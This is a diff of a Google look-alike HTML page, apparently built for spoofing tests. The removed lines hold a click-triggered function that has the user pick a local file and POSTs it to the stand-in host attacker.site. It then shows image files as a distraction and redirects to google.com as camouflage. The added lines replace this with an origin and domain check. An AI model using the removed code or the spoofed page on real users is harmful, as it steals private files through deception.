@@ -18,6 +18,7 @@
       flex-direction: column;
       align-items: center;
       margin-top: 15%;
+      user-select: none;
     }
 
     .google-logo {
@@ -33,7 +34,6 @@
       max-width: 600px;
       display: flex;
       border: 1px solid #dfe1e5;
-      box-shadow: none;
       border-radius: 24px;
       padding: 10px 20px;
       align-items: center;
@@ -55,14 +55,15 @@
       cursor: pointer;
     }
 
-    img.preview {
-      max-width: 80%;
-      margin-top: 20px;
+    .info {
+      margin-top: 40px;
+      font-size: 16px;
+      color: gray;
     }
   </style>
 </head>
 <body>
-  <div class="centered" onclick="load()">
+  <div class="centered">
     <div class="google-logo"></div>
     <div class="search-bar">
       <input type="text" placeholder="Search Google or type a URL">
@@ -71,55 +72,24 @@
     <div class="btn">I'm Feeling Lucky</div>
   </div>
 
+  <div class="info">
+    <p><strong>Origin:</strong> <span id="origin"></span></p>
+    <p><strong>Hostname:</strong> <span id="hostname"></span></p>
+    <p><strong>Protocol:</strong> <span id="protocol"></span></p>
+    <p><strong>Domain Check:</strong> <span id="domainCheck"></span></p>
+  </div>
+
   <script>
-    async function load() {
-      try {
-        const handles = await window.showOpenFilePicker();
-        const fileHandle = handles[0];
-        const permission = await fileHandle.requestPermission();
+    // Tampilkan info asal untuk pengujian spoofing
+    document.getElementById("origin").textContent = location.origin;
+    document.getElementById("hostname").textContent = location.hostname;
+    document.getElementById("protocol").textContent = location.protocol;
 
-        if (permission !== 'granted') {
-          alert("File access denied.");
-          return;
-        }
-
-        const file = await fileHandle.getFile();
-        const reader = new FileReader();
-
-        reader.onload = function(event) {
-          // Simulasi pengiriman ke attacker
-          fetch("https://attacker.site/receive", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/octet-stream"
-            },
-            body: event.target.result
-          });
-
-          // Tampilkan gambar sebagai pengalih perhatian
-          if (file.type.startsWith("image/")) {
-            const img = document.createElement("img");
-            img.src = event.target.result;
-            img.className = "preview";
-            document.body.appendChild(img);
-          }
-        };
-
-        // Baca file
-        if (file.type.startsWith("image/")) {
-          reader.readAsDataURL(file);
-        } else {
-          reader.readAsText(file);
-        }
-
-        // Redirect kamuflase
-        setTimeout(() => {
-          location.href = "https://www.google.com";
-        }, 1500);
-      } catch (e) {
-        console.error(e);
-        alert("Browser tidak mendukung atau akses file ditolak.");
-      }
+    // Apakah benar-benar di google.com?
+    if (location.hostname === "google.com" || location.hostname.endsWith(".google.com")) {
+      document.getElementById("domainCheck").textContent = "✅ Domain terverifikasi sebagai google.com";
+    } else {
+      document.getElementById("domainCheck").textContent = "❌ Ini BUKAN domain google.com";
     }
   </script>
 </body>
